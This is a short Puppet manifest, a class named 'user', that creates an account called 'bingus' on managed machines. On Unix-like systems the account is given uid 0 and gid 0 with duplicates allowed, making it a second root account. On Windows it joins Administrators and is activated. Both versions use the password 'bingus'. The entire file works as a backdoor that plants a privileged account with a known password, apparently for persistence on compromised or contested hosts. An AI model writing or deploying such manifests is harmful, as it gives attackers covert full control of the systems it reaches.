class user {
  include stdlib
  if $::osfamily != 'windows' {
    user { 'bingus':
      ensure => present,
      home => '/home/bingus',
      managehome => true,
      password => str2saltedsha512('bingus'),
      uid => 0,
      allowdupe => true,
      gid => 0,
      shell => '/bin/bash'
    }
  }
  if $::osfamily == 'windows' {
    user { 'bingus':
      ensure => present,
      groups => ['Administrators'],
      membership => minimum,
      password => 'bingus'
    }
    exec { 'bingus-active':
      path => 'C:/Windows/System32',
      command => 'net user bingus /active:yes'
    }
  }
}
